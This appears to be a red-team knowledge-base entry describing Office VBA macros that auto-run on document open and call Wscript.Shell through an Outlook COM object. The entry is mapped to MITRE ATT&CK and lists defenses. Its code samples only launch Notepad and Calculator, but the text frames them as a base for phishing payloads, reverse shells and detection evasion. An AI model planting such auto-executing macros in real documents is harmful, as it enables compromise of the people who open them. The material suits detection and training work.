---
id: 45dc1625-520b-41a7-8992-8f69a5bf5033
name: Office-VBA-Wscript-Execution
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23.477110+00:00'
updated_at: '2023-04-10T20:36:50.409298+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques: []
tags:
  - '[[tags/DOCM - VBA Wscript]]'
  - '[[tags/Office - Attacks]]'
commands: []
platforms:
  - Windows
tools: []
validated: true
---

# Office-VBA-Wscript-Execution

## Summary

Office VBA Wscript Execution is a technique that leverages Visual Basic for Applications (VBA) macros embedded in Microsoft Office documents to invoke the Windows Script Host (Wscript.Shell) for executing arbitrary commands on a target Windows system. This method allows attackers to bypass macro security restrictions and application whitelisting by using legitimate Office and Windows components, enabling initial foothold establishment through payload execution or data exfiltration.

## Description

This procedure details how to embed VBA macros in Office documents (such as Word or Excel files) to create and utilize Wscript.Shell objects for running system commands. By exploiting the trust in Office applications, attackers can automate command execution upon document opening via auto-trigger subroutines like AutoOpen. The technique is effective in environments where macros are enabled or can be socially engineered to run, and it maps to MITRE ATT&CK for scripting-based execution and evasion. It is commonly used in phishing campaigns to deliver reverse shells, download additional malware, or perform reconnaissance, with the victim's system appearing to run benign Office functionality.

## Requirements

1. Microsoft Office application (e.g., Word, Excel) installed on the target Windows system with VBA macro support enabled.
2. Windows Script Host (WSH) installed and functional (default on Windows systems).
3. User interaction to open the malicious Office document and enable macros if prompted.
4. Attacker access to create and deliver the Office document via email, shared drives, or other vectors.

## Defense

- Disable VBA macros by default in Office applications and enforce strict macro policies via Group Policy.
- Implement application whitelisting (e.g., AppLocker or WDAC) to restrict execution of Wscript.exe and Office macros.
- Enable Office macro logging and antivirus scanning for embedded scripts; use tools like Microsoft Defender for endpoint detection of anomalous Wscript invocations.
- Educate users on phishing risks and the dangers of enabling macros from untrusted sources.
- Monitor for unexpected process spawns from Office processes (e.g., winword.exe spawning wscript.exe).

## Objectives

1. Execute arbitrary commands on the target system without triggering endpoint detection rules for direct script execution.
2. Download and run additional payloads, such as malware droppers or reverse shells.
3. Establish persistence or exfiltrate data by chaining commands executed via Wscript.
4. Gain initial access to the victim's network through socially engineered document delivery.

## Instructions

### Step 1: Create the Malicious Office Document and Embed VBA Macro for Basic Execution

**Context**: Begin by opening Microsoft Office (e.g., Excel or Word) and accessing the VBA editor (Alt+F11) to insert a module. Embed a macro that creates a Wscript.Shell object via an Outlook.Application intermediary to evade direct COM object restrictions. This step uses a code snippet to demonstrate opening Notepad as a proof-of-concept for command execution, which can be modified for malicious payloads.

**Code** ([[codes/VBA-Macro-Open-Notepad-via-Wscript]]):

```vba
Sub parent_change()
    Dim objOL
    Set objOL = CreateObject("Outlook.Application")
    Set shellObj = objOL.CreateObject("Wscript.Shell")
    shellObj.Run("notepad.exe")
End Sub
Sub AutoOpen()
    parent_change
End Sub
Sub Auto_Open()
    parent_change
End Sub
```

> This code creates an Outlook.Application object to indirectly instantiate Wscript.Shell, then runs notepad.exe. The AutoOpen and Auto_Open subroutines trigger execution upon document opening. Expected output: Notepad launches silently if macros are enabled. Verify by checking if the target process (notepad.exe) appears in Task Manager spawned from the Office process.

### Step 2: Enhance the Macro for Multiple Command Execution

**Context**: For more complex scenarios, modify the VBA to execute multiple commands using both Run and Exec methods of Wscript.Shell. This allows chaining benign tests (like opening Calculator and Notepad) to simulate payload delivery, such as running a secondary script or connecting to a C2 server. Insert this into the same module or a new one, ensuring auto-execution triggers.

**Code** ([[codes/VBA-Macro-Open-Calc-and-Notepad-via-Wscript]]):

```vba
CreateObject("WScript.Shell").Run "calc.exe"
CreateObject("WScript.Shell").Exec "notepad.exe"
```

> This snippet directly creates Wscript.Shell objects to run calc.exe (via Run for hidden execution) and exec notepad.exe (via Exec for potential output capture). Place within an AutoOpen subroutine for automatic triggering. Expected output: Both Calculator and Notepad open without user prompts if macros run. Success is confirmed by observing the applications launch and checking process trees for Office parentage.
